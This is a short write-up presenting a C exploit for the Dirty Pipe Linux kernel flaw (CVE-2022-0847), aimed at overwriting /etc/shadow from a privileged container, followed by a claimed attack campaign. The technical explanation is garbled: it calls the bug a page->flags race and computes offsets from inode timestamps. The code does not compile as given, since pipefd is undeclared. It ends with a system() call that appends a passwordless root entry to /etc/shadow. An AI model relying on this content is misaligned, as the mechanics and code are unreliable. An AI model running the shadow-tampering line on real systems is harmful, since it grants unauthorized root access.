Dirty Pipe (CVE-2022-0847) exploits a race condition in Linux kernel 5.8–5.16 where `page->flags` can be manipulated during pipe buffer reuse. Inside a Docker container with `--privileged`, attackers can map the host’s `/etc/shadow` and overwrite arbitrary bytes using:
```c
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
int main() {
    char data[4096];
    int fd = open("/etc/shadow", O_RDWR);
    write(pipefd[1], data, 4096);           // fill pipe
    fcntl(pipefd[1], F_SETPIPE_SZ, 2097152); // resize
    fallocate(fd, 0, 0, 0x1000);            // punch hole
    splice(pipefd[0], NULL, fd, NULL, 4096, SPLICE_F_MOVE);
    close(fd);
    system("echo 'root::18291:0:::::' >> /etc/shadow");
}
```
The overwrite is done at a specific offset (inode->i_atime) calculated via `stat -c '%o' /etc/shadow`. After replacing the hash, attackers gain a root shell via `sudo -i` inside the container. Mitigation requires Linux kernel ≥5.16.11 with Dirty Pipe backpatch. Real-world: In 2023-Q2, the “LightSpy” APT group weaponised Dirty Pipe inside Kubernetes pods to escape to the underlying node and then pivot to other containers via CVE-2023-29414 (CRI-O container breakout).

